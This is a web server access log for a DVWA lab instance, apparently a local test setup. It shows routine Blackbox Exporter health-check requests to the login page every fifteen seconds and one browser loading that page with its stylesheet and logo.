172.18.0.3 - - [27/Apr/2025:15:35:13 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [27/Apr/2025:15:35:13 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.5:80" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [27/Apr/2025:15:35:28 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [27/Apr/2025:15:35:28 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.5:80" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [27/Apr/2025:15:35:43 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [27/Apr/2025:15:35:43 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.5:80" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [27/Apr/2025:15:35:58 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [27/Apr/2025:15:35:58 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.5:80" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [27/Apr/2025:15:36:13 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [27/Apr/2025:15:36:13 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.5:80" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [27/Apr/2025:15:36:28 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [27/Apr/2025:15:36:28 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.5:80" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [27/Apr/2025:15:36:43 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [27/Apr/2025:15:36:43 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.5:80" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [27/Apr/2025:15:36:58 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [27/Apr/2025:15:36:58 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.5:80" "Blackbox Exporter/0.26.0"
192.168.178.1 - - [27/Apr/2025:15:37:09 +0000] "GET /login.php HTTP/1.1" 200 1193 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
192.168.178.1 - - [27/Apr/2025:15:37:09 +0000] "GET /dvwa/css/login.css HTTP/1.1" 200 741 "http://192.168.178.152:8080/login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
192.168.178.1 - - [27/Apr/2025:15:37:09 +0000] "GET /dvwa/images/login_logo.png HTTP/1.1" 200 9375 "http://192.168.178.152:8080/login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
172.18.0.3 - - [27/Apr/2025:15:37:13 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [27/Apr/2025:15:37:13 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.5:80" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [27/Apr/2025:15:37:28 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [27/Apr/2025:15:37:28 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.5:80" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [27/Apr/2025:15:37:43 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [27/Apr/2025:15:37:43 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.5:80" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [27/Apr/2025:15:37:58 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [27/Apr/2025:15:37:58 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.5:80" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [27/Apr/2025:15:38:13 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [27/Apr/2025:15:38:13 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.5:80" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [27/Apr/2025:15:38:28 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [27/Apr/2025:15:38:28 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.5:80" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [27/Apr/2025:15:38:43 +0000] "GET / HTTP/1.1" 302 442 "-" "Blackbox Exporter/0.26.0"
172.18.0.3 - - [27/Apr/2025:15:38:43 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://172.18.0.5:80" "Blackbox Exporter/0.26.0"
